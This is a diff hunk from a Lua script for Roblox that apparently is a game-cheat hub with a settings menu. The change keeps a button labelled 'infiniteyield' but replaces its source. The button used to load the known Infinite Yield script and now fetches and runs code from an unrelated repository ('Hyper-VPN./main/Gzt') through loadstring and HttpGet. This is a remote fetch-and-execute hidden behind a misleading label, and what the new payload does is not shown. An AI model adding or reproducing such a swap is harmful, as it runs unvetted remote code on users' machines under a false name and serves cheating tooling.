@@ -248,7 +248,7 @@ Setting2:AddToggle("BootsWhitescreen", false, function(o)
  _G.BootsWhitescreen = o
 end)
 Setting2:AddButton("infiniteyield" , function()
- loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/bewmaki/Hyper-VPN./main/Gzt'))()
 end)
 Setting2:AddButton("ResetCamera" , function()
  game:GetService("Workspace").CurrentCamera:Destroy()
